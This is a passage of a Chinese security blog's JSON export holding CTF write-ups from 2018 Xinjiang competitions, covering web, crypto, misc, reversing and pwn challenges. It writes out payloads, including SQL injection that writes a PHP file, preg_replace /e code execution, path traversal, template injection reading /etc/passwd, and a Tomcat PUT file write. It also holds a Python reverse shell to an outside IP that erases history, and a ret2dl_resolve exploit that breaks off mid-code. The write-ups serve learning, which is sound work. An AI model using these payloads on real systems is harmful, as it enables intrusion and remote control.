{"meta":{"title":"xjseck's Home","subtitle":"xjseck","description":"Xjseck blog","author":"xjseck","url":"https://www.xjseck.com"},"pages":[{"title":"about","date":"2017-09-06T08:23:38.000Z","updated":"2018-06-11T07:22:23.394Z","comments":false,"path":"about/index.html","permalink":"https://www.xjseck.com/about/index.html","excerpt":"","text":""},{"title":"category","date":"2017-09-06T08:18:04.000Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"category/index.html","permalink":"https://www.xjseck.com/category/index.html","excerpt":"","text":""},{"title":"link","date":"2017-09-06T08:06:57.000Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"link/index.html","permalink":"https://www.xjseck.com/link/index.html","excerpt":"","text":""},{"title":"search","date":"2018-06-11T07:22:23.395Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"search/index.html","permalink":"https://www.xjseck.com/search/index.html","excerpt":"","text":""},{"title":"tag","date":"2017-09-06T08:21:21.000Z","updated":"2018-06-11T07:22:23.396Z","comments":false,"path":"tag/index.html","permalink":"https://www.xjseck.com/tag/index.html","excerpt":"","text":""}],"posts":[{"title":"新疆首届攻防比赛wp","slug":"新疆首届攻防比赛wp","date":"2018-09-18T06:31:41.000Z","updated":"2018-09-22T05:00:24.886Z","comments":true,"path":"2018/09/18/新疆首届攻防比赛wp/","link":"","permalink":"https://www.xjseck.com/2018/09/18/新疆首届攻防比赛wp/","excerpt":"","text":"[心得]下线攻防类比赛，算是第一次参加赛宁举办的线下攻防了，赛前以为会有简单的内置后门可以使用，都已经写好了通过一句话木马写内存马的批量脚本了，但是比赛时没有发现简单的内置一句话木马，导致比赛进程不是很顺利，名次也不佳，其次也是自己太菜。这里就再次简单的总结一下线下攻防比赛的思路和这次比赛的分析。 线下比赛套路汇总就把给别人培训时写好的PPT贴一下吧线下攻防的比赛思路大致应该就这么多吧，比较硬的技能点应该是快速定位漏洞和批量脚本的编写上了吧，只要把套路融会贯通，应该能狗住。 比赛的插曲这里贴一下赛宁比赛的比赛说明关键点如下 比赛环境 选手登录后下载环境信息zip包，zip解压密码即为登录密码，zip包中包含包含以下信息：环境ip、登录私钥、选手token； 题目虚拟机使用私钥ssh登录，用户名为xctf，私钥在下载的环境信息zip包中； 主办方提供各赛题端口的流量数据，在本队维护的题目虚拟机/home/xctf/packages/下，流量数据每10分钟提供一次，如果磁盘空间不足注意清理。 每个参参赛选手员网线连接自己PC，dhcp获取地址即可两个web，两个pwn提交Flag登录页面下载的环境信息包含token信息，选手凭借此 token 身份提交 flag。提交样例：curl http://172.16.200.14:9000/submit_flag/ -d &quot;flag=XXXXX&amp;token=XXXXX&quot; 比赛过程中通过私钥进行登录，导致很多选手不会使用私钥登录，很尴尬，具体的使用如下 123sudo ssh -i id_rsa xctf@172.16.5.103sudo scp -i id_rsa xctf@172.16.3.102:/tmp/web102-cap.tar /home/xjseck/桌面/ windwos建议使用MobaXterm shell终端，导入私钥文件，进行登录，和文件下载 后面的操作按照上面的比赛套路进行操作就OK了。 web的漏洞汇总WEB2汇总首先我们还要了解web网站的文件配置权限我们可以看出用户的操作权限明显比www-data用户权限高，也就是防御者的权限高于攻击者的权限，可以防止getshell之后被删站，也可以进行源码的修改。之后就可以进行常规的操作了D盾扫描没有常见的后门文件，那现在思路就有两个了，一、先不进行防御，下载流量文件/home/xctf/packages/进行分析，找到漏洞点，利用别人的shell。二、进行防御，可以通过文件的所属者，进行shell的查杀，之后进行代码审计，寻找漏洞。漏洞一 添加cookie，绕过后台登录验证。然后水印图片处上传php3后门文件getshell 漏洞二后台登录处sql注入/admin/files/login.php1234567891011&lt;?phpob_start();require '../inc/conn.php';$login=$_POST['login'];$user=$_POST['user'];$password=$_POST['password'];$checkbox=$_POST['checkbox'];if ($login&lt;&gt;\"\")&#123;$query = \"SELECT * FROM manage WHERE user='$user'\";$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());$users = mysql_fetch_array($result); 未对用户输入的用户名和密码进行过滤导致sql注入pyload：user=1&#39; union select 1,2,3,4,5,6,7,&#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/upload/1.php&#39;#&amp;password=qweq&amp;login=yes 漏洞三/files/list.php129行左右12345function getpages($str)&#123; echo '123';&#125; &lt;?php if(strpos('list',__FILE__)===false)&#123;preg_replace(\"/123(.*)123/ies\", 'getpages(\"\\1\")', $_GET[\"pages\"]); &#125; ?&gt; 典型的preg_replace /e后门比赛当时就4个小时的时间，光去利用了第一个漏洞，后面的漏洞，在日志流量中也没有看到，就没有细看，问题很大。payload：files/list.php?pages=123{${eval($_GET[a])}}123&amp;a=system(&#39;cat /flag&#39;); WEB1汇总Nodejs的一个博客，这个比赛的时候大家应该都没有找到什么漏洞吧，赛后问了一下主办方的师傅，一般的思路点就是：搜索uoload 或者download等关键字，进行查找分析代码，具体漏洞点有main.js 在处理uploads 的逻辑时，可以从url中传入..%2f 造成目录穿越读取任意文件1234567891011121314151617181920app.get(&quot;/uploads/(*)&quot;,function(req, res) &#123; if (req.path.indexOf(&quot;images&quot;) &lt; 0) &#123; res.set(prefix); res.send(&quot;Error！&quot;); res.end(); &#125; else if (req.path.indexOf(&apos;\\\\.md&apos;) &gt; 0) &#123; res.set(prefix); res.send(&quot;Error！&quot;); res.end(); &#125; else &#123; res.set(&#123; &quot;Content-Type&quot;: &quot;images/jpeg&quot; &#125;); text = fs.readFileSync(__dirname + decodeURIComponent(req.path)); res.send(text); res.end(); &#125;&#125;); payload：/uploads/images/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/flag","categories":[{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/categories/比赛/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"攻防","slug":"攻防","permalink":"https://www.xjseck.com/tags/攻防/"}]},{"title":"首届新疆网络安全知识技能竞赛(团体赛)","slug":"首届新疆网络安全知识技能竞赛-团体赛","date":"2018-09-13T07:38:11.000Z","updated":"2018-09-22T05:01:53.790Z","comments":true,"path":"2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/","link":"","permalink":"https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/","excerpt":"","text":"前言第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。 团体解题晋级赛有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。 Web revenge_of_sqlsql的复仇，应该是和sql注入有关，首先进行敏感目录扫描，发现.git源码泄露直接githack 发现 index.php文件存在 过滤空格的盲注注入，直接sqlmap 跑数据库但是发现没有sqlmap -r 1.txt –random-agent –dbms=mysql –tamper=space2comment.py -v 3 –sql-shell 12345available databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] sql1 admin xman 登录进入 和源码的逻辑相同没有显示也可以手工注入登录Username=&#39;/**/union/**/select(&#39;202cb962ac59075b964b07152d234b70&#39;)#&amp;password=123最后分析一下git历史信息 发现有flag22222.php使用sqlmap 跑一下 Web baby python没有啥思路，直接爆破url参数发现出现花括号 会出现信息的不完整输出，那应该明确了考点，就是python web的模板注入，可以直接使用函数读文件也可以使用其他python 沙盒绕过12&#123;&#123;&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/flag&apos;).read() &#125;&#125;等python链进行代码的执行http://10.98.98.25:5554/404?msg=&apos;&#125;&#125;&#123;&#123; open(&apos;/etc/passwd&apos;).read() &#125;&#125; ezupload文件上传常规套路：直接大小写、javascript、 改后缀 、截断或这让js失效 http [步骤]访问发现提示 不是本地人，不允许访问， 于是修改xff为127.0.0.1或localhost伪造为本地伪造后提示未登录，查看cookie发现存在login=0的键值，将0修改为1得到flag ezpentest [分析]这道题，没有队伍解出来，当时进行了目录的扫描，和nmap的扫描，发现了8080 端口tomcat，按题目的说明，应该是一个tomcat溢出漏洞，赛后讨论应该是CVE-2017-12617(远程代码执行漏洞)影响范围: 1234567Apache Tomcat 9.0.0.M1-9.0.0Apache Tomcat 8.5.0-8.5.22Apache Tomcat 8.0.0.RC1-8.0.46Apache Tomcat 7.0.0-7.0.81 当时没有网，也就没有找到具体的payload ，可以参考P牛的vuln库 任意文件写入12345678910PUT /1.jsp/ HTTP/1.1Host: your-ip:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5shell Check in考察的是python的cPickle的反序列化漏洞 123456789101112131415161718192021222324252627282930313233343536373839# !/usr/bin/env python# -*- coding:utf-8 -*-import marshalimport base64import cPickleimport urllibdef foo():#you should write your code in this function import socket import os,pty def test(ip,port): s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,int(port))) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) shell= \"/bin/sh\" os.unsetenv(\"HISTFILE\") os.unsetenv(\"HISTFILESIZE\") os.unsetenv(\"HISTSIZE\") os.unsetenv(\"HISTORY\") os.unsetenv(\"HISTSAVE\") os.unsetenv(\"HISTZONE\") os.unsetenv(\"HISTLOG\") os.unsetenv(\"HISTCMD\") os.putenv(\"HISTFILE\",'/dev/null') os.putenv(\"HISTSIZE\",'0') os.putenv(\"HISTFILESIZE\",'0') pty.spawn(shell) s.close() test('202.112.51.130',9999)try:#尝试使用cPickle来序列号代码对象 cPickle.dumps(foo.func_code)except Exception as e: print e #TypeError: can't pickle code objectscode_serialized = base64.b64encode(marshal.dumps(foo.func_code))print code_serialized misc 流量包解密02题目进行了说明，mac地址就是秘钥，国赛的题目也出现过，当时提取mac之后没有跑出来，最会拼一下脑洞发现，爆破的时候的数据包的mac 地址就是密码提示是mac，尝试提取mac不行，结果就是脑洞 1 B4:0B:44:C2:D5:FF xj WPA (1 handshake)然后发现就是dns apr 做中间人，做了个test.txt success.txt的测试就没有url了需要再次脑洞一下吧。还是那个师傅的blog说的是url flag{http://www.wiattack.net/test.txt} 如来十三掌1夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮 与佛论禅解密：MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9尝试base64解密失败，继续尝试，发现先rot13，在base64ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab} Find_your_flag是一个内存取证的题目Volatility工具安排一下遍历文件找一找flag导出文件发现需要密码，根据提示猜测密码可能在剪切板 倍四家族这个题是一个7z的带密码的压缩包，想推导密码，你需要点脑洞，根据题目和压缩包，发现密码是flag字符的base64编码，解密出flag.txt最后写一个脚本进行每一行的解密（参考官方wp） 123456789101112131415161718192021222324252627282930def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('flag.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\\n', '') norm_line = line.replace('\\n', '').decode('base64').encode('base64').replace('\\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 得到 1W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ 猜测是base85，python跑一下 1234In [1]: import base64In [2]: base64.b85decode(b'W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ')Out[2]: b'flag&#123;we_buried_love_family_dissatisfacted&#125;' 密码 short_story一个doc文档，字体有点高低和一个隐藏的矩阵，应该是hill加密 1234美国代表团访华时曾有一名官员当着周总理的面说中国人很喜欢低着头走路而我们美国人却总是抬着头走路周总理不慌不忙脸带微笑地说这并不奇怪因为我们中国人喜欢走上坡路而你们美国人喜欢走下坡路AABBBBAAABBABBAAAABBAABBBBAAABBBAAAAABBAAAABABAAAABABBAAAABBAAAABABBABABABAABABBAAAABABABAhrwdhrygcqwdbnklbk 继续从文档中获得密钥。文档末尾隐藏了一个矩阵，选中更改字体颜色后可以看到。根据这个矩阵，联想到hill加密 先根据密钥矩阵计算逆矩阵，将密文按照2个2个分组，与逆矩阵右乘得到明文。 12345678910111213141516171819# coding:UTF-8key = [-7,2,4,-1]m = \"hrwdhrygcqwdbnklbk\"c= []for x in range(len(m)): if(m[x]&gt;='a'and x&lt;='z'): print ord(m[x])-97 c.append(ord(m[x])-97)print ctemp = []for i in range(0,len(c),2): temp.append(chr(((key[0] * c[i]+key[1] * c[i+1])%26)+97)) temp.append(chr(((key[2] * c[i] + key[3] * c[i+1])%26)+97))temp = ''.join(temp)print temp[::-1] 得到llihllamssihtrednu 题目中说“走下坡路”，所以想到字符串经过反向处理。 得到flag{underthissmallhill}。 weak_des给出了加密代码参考0xptdg战队的py12345678#coding:utf-8from Crypto.Cipher import DESimport libnumct=open('ciphertext','rb').read()KEY=libnum.n2s(0xe0e0e0e0f1f1f1f1)IV='13245678'a=DES.new(KEY,DES.MODE_OFB,IV)print a.decrypt(ct) 12345678910111213141516171819202122The furthest distance in the worldIs not between life and deathBut when I stand infront of youYet you don&apos;t know that I love youIs not when I stand infront of youYet you can&apos;t see my loveBut when undoubtedly knowing the love from bothYet can not be togetherIs not being apart while being in loveBut when painly cannot resist the yearningYet pretending you have never been in my heartIs not when painly can not resist the yearningyet pretending you have never been in my heartbut using one&apos;s in different heartTo dig an uncrossable riverFor the one who loves youflag&#123;_poor_single_dog_has_found_an_echo_from_it&#125; 个人和团体的re+pwn解题汇总re easy-comparejadx先打开看MainActivity 123456789101112131415public class MainActivity extends AppCompatActivity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; if (Check.checkflag(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString())) &#123; Toast.makeText(MainActivity.this, \"you are right~!\", 1).show(); &#125; else &#123; Toast.makeText(MainActivity.this, \"wrong!\", 1).show(); &#125; &#125; &#125;); &#125;&#125; 调用了so中的Check.checkflag函数校验flag，定位到so中的函数 12345678910111213signed int __fastcall Java_com_testjava_jack_fakefunc_Check_checkflag(int a1)&#123; signed int v1; // r4 const char *v2; // r5 v1 = 0; v2 = (const char *)(*(int (**)(void))(*(_DWORD *)a1 + 676))(); j_getKey(); _android_log_print(4, \"INJECT\", \"asdasd\"); if ( !strcmp(v2, \"this_is_easy_so\") ) v1 = 1; return v1;&#125; 发现是与一个固定的字符串对比 但是尝试一下程序中提交this_is_easy_so并不对，查看导出表信息，发现存在init_arrary里面对strcmp进行了Inline hook,定位到fake function。发现是aes，key就是动态解密的固定base64字符串。解密得到flag Get-A-Wayshell这个二进制数据是一段shellcode，先写程序把它Load起来 123456789101112131415FILE *fp = fopen(\"file.bin\", \"rb\"); if (fp) &#123; fseek(fp, 0, SEEK_END); DWORD dwSize = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pAddr = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); fread(pAddr, dwSize, 1, fp); fclose(fp); __asm &#123; mov eax, pAddr; call eax; &#125; &#125; 提示输入key，随便输入一个 123F:\\Project\\LoadShell.exeplease input your answer:asdsdwrong way od载入看下 跟踪会发现在0x10000000地址释放出主要模块 12345678910111213141516171819100010CD 85C0 test eax,eax100010CF 74 11 je short 100010E2100010D1 B9 19000000 mov ecx,0x19100010D6 BE C0710110 mov esi,0x100171C0100010DB BF 30720110 mov edi,0x10017230100010E0 F3:A5 rep movs dword ptr es:[edi],dword ptr ds&gt;100010E2 68 58440110 push 0x10014458 ; ASCII &quot;please input your answer:&quot;100010E7 E8 48170000 call 10002834100010EC 83C4 04 add esp,0x4100010EF C64424 10 00 mov byte ptr ss:[esp+0x10],0x0100010F4 8D4424 11 lea eax,dword ptr ss:[esp+0x11]100010F8 6A 63 push 0x63100010FA 6A 00 push 0x0100010FC 50 push eax100010FD E8 AE660000 call 100077B010001102 83C4 0C add esp,0xC10001105 8D4424 10 lea eax,dword ptr ss:[esp+0x10]10001109 50 push eax1000110A 68 74440110 push 0x10014474 ; ASCII &quot;%s&quot; 在此处下断点分析发现是个迷宫问题，dump下迷宫来 12345678&#123; 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01&#125;; 按照迷宫得到的解并不对，我们仔细查看内存发现调用了一些反调试的函数，根据回溯，回溯到 1234567100010C2 /0F85 D8000000 jnz 100011A0100010C8 |E8 B3130000 call 10002480100010CD |85C0 test eax,eax100010CF |74 11 je short 100010E2100010D1 |B9 19000000 mov ecx,0x19100010D6 |BE C0710110 mov esi,0x100171C0100010DB |BF 30720110 mov edi,0x10017230 这里会因为反调试来修改迷宫数组，在修改之前dump真正的迷宫 123401 00 01 01 01 01 01 01 01 01 01 00 01 00 00 00 01 01 01 01 01 00 00 00 01 00 01 01 01 01 01 0101 01 01 00 01 01 01 01 01 01 01 01 00 00 00 00 00 01 01 01 01 01 00 01 01 01 00 01 01 01 01 0101 00 00 00 00 01 01 01 01 01 01 00 01 01 01 01 01 01 01 01 01 00 00 00 00 01 01 01 01 01 01 0101 01 00 01 得到解 ssddwddsssdddssaaassddds 输入得到flag 81dsa65edckyqutiaghjw3w2 LoginToMe拖入ida看下就这么些代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned __int16 s; // [rsp+10h] [rbp-70h] unsigned __int16 v6; // [rsp+12h] [rbp-6Eh] int v7; // [rsp+14h] [rbp-6Ch] int v8; // [rsp+18h] [rbp-68h] unsigned __int16 v9; // [rsp+1Ch] [rbp-64h] unsigned __int16 v10; // [rsp+1Eh] [rbp-62h] unsigned __int16 v11; // [rsp+20h] [rbp-60h] unsigned __int16 v12; // [rsp+22h] [rbp-5Eh] int v13; // [rsp+70h] [rbp-10h] int v14; // [rsp+74h] [rbp-Ch] int v15; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] memset(&amp;s, 0, 0x60uLL); v13 = 0; printf(\"input:\", argv, &amp;v14, argv); __isoc99_scanf(\"%s\", &amp;s); if ( strlen((const char *)&amp;s) == 20 ) &#123; v3 = time(0LL); srand(v3); v15 = rand() % 100; for ( i = 0; i &lt; v15; ++i ) ; if ( s * v6 != 342772773 || s + v6 != 39526 || v7 - v8 != 1005712381 || (unsigned __int16)v7 + HIWORD(v7) != 56269 || (unsigned __int16)v8 - HIWORD(v8) != 15092 || (char)v7 * (char)v8 != 0x29D6 || SBYTE2(v7) * SBYTE2(v8) != 12051 || SHIBYTE(v7) + SHIBYTE(v8) != 172 || v9 * v10 != 171593250 || v9 + v10 != 26219 || v11 * v12 != 376306868 || v11 + v12 != 40341 ) &#123; puts(\"check failed~!\"); &#125; else &#123; puts(\"check ok~!\"); &#125; &#125; return 1;&#125; 对输入的flag进行了条件判断，根据上述条件求解即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#-*- coding:utf-8 –*-from z3 import *#定义变量a = Int('a')b = Int('b')c = Int('c')d = Int('d')e = Int('e')f = Int('f')m = Int('m')n = Int('n')p = Int('p')q = Int('q')solver = Solver()# 设置变量范围solver.add(a &gt;= 0)solver.add(b &gt;= 0)solver.add(a &lt; 0xffff)solver.add(b &lt; 0xffff)solver.add(c &gt;= 0)solver.add(d &gt;= 0)solver.add(c &lt; 0xffff)solver.add(d &lt; 0xffff)solver.add(e &gt;= 0)solver.add(f &gt;= 0)solver.add(e &lt; 0xffff)solver.add(f &lt; 0xffff)solver.add(m &gt;= 0)solver.add(n &gt;= 0)solver.add(m &lt; 0xffffffff)solver.add(n &lt; 0xffffffff)# 设置表达式solver.add(a*b == 0x146E4C25)solver.add(a+b == 0x9a66)solver.add(c*d == 0xa3a4e22)solver.add(c+d == 0x666b)solver.add(e*f == 0x166dfcb4)solver.add(e+f == 0x9d95)solver.add(m-n == 0x3BF1F3FD)solver.add(m%0x10000 +m/0x10000 ==0xDBCD)solver.add(n%0x10000 -n/0x10000 ==0x3AF4)#获取结果print(\"solving...\")if(solver.check()==sat): print solver.model() 12345678[f = 14644, b = 12849, a = 26677, d = 13625, n = 947221353, m = 1952933734, c = 12594, e = 25697] exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#-*- coding:utf-8 –*-from z3 import *#定义变量a = Int('a')b = Int('b')c = Int('c')d = Int('d')e = Int('e')f = Int('f')m = Int('m')n = Int('n')p = Int('p')q = Int('q')solver = Solver()# 设置变量范围solver.add(a &gt;= 0)solver.add(b &gt;= 0)solver.add(a &lt; 0xffff)solver.add(b &lt; 0xffff)solver.add(c &gt;= 0)solver.add(d &gt;= 0)solver.add(c &lt; 0xffff)solver.add(d &lt; 0xffff)solver.add(e &gt;= 0)solver.add(f &gt;= 0)solver.add(e &lt; 0xffff)solver.add(f &lt; 0xffff)solver.add(m &gt;= 0)solver.add(n &gt;= 0)solver.add(m &lt; 0xffffffff)solver.add(n &lt; 0xffffffff)# 设置表达式solver.add(a*b == 0x146E4C25)solver.add(a+b == 0x9a66)solver.add(c*d == 0xa3a4e22)solver.add(c+d == 0x666b)solver.add(e*f == 0x166dfcb4)solver.add(e+f == 0x9d95)solver.add(m-n == 0x3BF1F3FD)solver.add(m%0x10000 +m/0x10000 ==0xDBCD)solver.add(n%0x10000 -n/0x10000 ==0x3AF4)#获取结果print(\"solving...\")if(solver.check()==sat): print solver.model() 又拍苍蝇本题修改自山东省赛拍苍蝇，大大降低了难度，只需要将苍蝇拍完毕即可得到Flag。每个苍蝇中包含了一个secret值，当苍蝇被拍死的时候（对话框销毁的时候），才会初始化这个secret值，所以就算定位到了苍蝇是否死活的标志位进行强制修改也无效，当拍死的苍蝇数量达到24只的时候，会依次计算每个苍蝇携带的secret值，跟一个全局变量循环右移索引位，然后异或，然后根据索引从这个dowrd中取一位放到flag中。由于添加的花指令，所以需要先去除之后才方便分析，花指令特征 EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58 脚本如下： 1234567891011121314151617181920212223242526VAR CodeBaseVAR CodeSizeBPHWCALLBPHWCBCGMI eip, CODEBASEMOV CodeBase,$RESULTGMI eip, CODESIZEMOV CodeSize,$RESULTvar junk_addrlab_find:find CodeBase,#EB14EA50EB0BEA8BC4A8017406EB0BEA??660FD64424EBEBEEEA4C58#,CodeSizemov junk_addr,$RESULTcmp junk_addr,0jz exitMOV [junk_addr],#90909090909090909090909090909090909090909090909090909090#jmp lab_findexit:RET 之后od就清晰了，根据success字符串定位到关键地方,cl是索引 1234567891011121314012D30CD B8 775F123C mov eax,0x3C125F77012D30D2 D3C8 ror eax,cl012D30D4 3382 E0000000 xor eax,dword ptr ds:[edx+0xE0]012D30DA 8985 6CFFFFFF mov dword ptr ss:[ebp-0x94],eax012D30E0 90 nop012D3118 8BC1 mov eax,ecx012D311A 25 03000080 and eax,0x80000003012D311F 79 05 jns short Fly.012D3126012D3121 48 dec eax012D3122 83C8 FC or eax,0xFFFFFFFC012D3125 40 inc eax012D3126 8A8405 6CFFFFFF mov al,byte ptr ss:[ebp+eax-0x94]012D312D 88840D 70FFFFFF mov byte ptr ss:[ebp+ecx-0x90],al 定位初始secret的地方 借助xspy定位消息响应函数 123456789Message map: 0x0058880C (Fly3.exe+ 0x18880c )Message map entries: 0x00588818 (Fly3.exe+ 0x188818 )OnMsg:WM_TIMER(0113),func= 0x00404E30 (Fly3.exe+ 0x004e30 )OnMsg:WM_LBUTTONDOWN(0201),func= 0x00405150 (Fly3.exe+ 0x005150 )OnMsg:WM_LBUTTONUP(0202),func= 0x004051D0 (Fly3.exe+ 0x0051d0 )OnMsg:WM_MOUSEHOVER(02a1),func= 0x004051E0 (Fly3.exe+ 0x0051e0 )OnMsg:WM_MOUSELEAVE(02a3),func= 0x00405200 (Fly3.exe+ 0x005200 )OnMsg:WM_MOUSEMOVE(0200),func= 0x00405220 (Fly3.exe+ 0x005220 )OnMsg:WM_LBUTTONDBLCLK(0203),func= 0x004051D0 (Fly3.exe+ 0x0051d0 ) 定位到数组dwKey 12345678910111213141516void __thiscall CFlyWnd::OnLButtonDown(CFlyWnd *this, unsigned int nFlags, CPoint point)&#123; CFlyWnd *v3; // esi int v4; // eax char szOut[100]; // [esp+4h] [ebp-68h] v3 = this; szOut[0] = 0; v4 = this-&gt;nIndex; this-&gt;is_death = 1; this-&gt;secret = dwKey[v4]; memset(&amp;szOut[1], 0, 0x63u); _wsprintfA(szOut, &quot;fly death %d&quot;, 1); PostMessageW(v3-&gt;m_hWnd, 0x10u, 0, 0); CWnd::Default((CWnd *)&amp;v3-&gt;vfptr);&#125; 12345678910DWORD dwXorKey = 0x3c125f77; DWORD dwKey[100] = &#123; 0x59206b45, 0xfa6d1fde, 0xaa30f5ec, 0x81b4728a, 0x43a213cf, 0x8c85f3cc, 0xe8922b1c, 0xdf191586, 0x4158266a, 0xdfac3b1c, 0xb9ae65f1, 0xde83b273, 0x914ba440, 0xcb8ed8f4, 0x4beac32d, 0x8cd64e10, 0x6b120c25, 0x498df831, 0xa2b9f93d, 0x79d6d0e4, 0x47c640f0, 0xa0c3dbd6, 0x7b4def96, 0x158e8c4d &#125;; char szResult[100] = &#123; 0 &#125;; for (int i = 0; i &lt; 24; i++) &#123; DWORD dwTmp = dwKey[i] ^ CROR(dwXorKey, i); szResult[i] = (PBYTE(&amp;dwTmp))[i % 4]; &#125; printf(szResult); 得到flag:204f8ab152a0e8627fd21b01 本题可以不去进项算法分析，直接模拟点击点掉所有苍蝇即可。 1234567891011121314151617181920BOOL CALLBACK EnumWindowProc(HWND hWnd, LPARAM lParam)&#123; char szClassName[100] = &#123; 0 &#125;; GetClassName(hWnd, szClassName, 100); RECT m_rect; GetWindowRect(hWnd, &amp;m_rect); if (strcmp(\"#32770\", szClassName) == 0 &amp;&amp; m_rect.bottom - m_rect.top == 60 &amp;&amp; m_rect.right - m_rect.left == 60) &#123; SendMessage(hWnd, WM_LBUTTONDOWN, NULL, NULL); &#125; return TRUE;&#125;while (1)&#123; //在某个函数里面调用 EnumWindows(EnumWindowProc, NULL); Sleep(1000);&#125; PWN baby_stack 没有输出无法leak，没有提供libc，有溢出，考虑ret2dl_resolve 可以手组结构，仿造roputils写ret2dl_resolve函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding=utf8from pwn import *context.log_level = 'debug'p = process('./babystack')binary = ELF('./babystack')def ret2dl_resolve(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1): jmprel = ELF_obj.dynamic_value_by_tag(\"DT_JMPREL\")#rel_plt relent = ELF_obj.dynamic_value_by_tag(\"DT_RELENT\") symtab = ELF_obj.dynamic_value_by_tag(\"DT_SYMTAB\")#dynsym syment = ELF_obj.dynamic_value_by_tag(\"DT_SYMENT\") strtab = ELF_obj.dynamic_value_by_tag(\"DT_STRTAB\")#dynstr versym = ELF_obj.dynamic_value_by_tag(\"DT_VERSYM\")#version plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr p_name = fake_stage+8-strtab len_bypass_version = 8-(len(func_name)+1)%0x8 sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab if sym_addr_offset%0x10 != 0: if sym_addr_offset%0x10 == 8: len_bypass_version+=8 sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab else: error('something error!') fake_sym = sym_addr_offset/0x10 while True: fake_ndx = 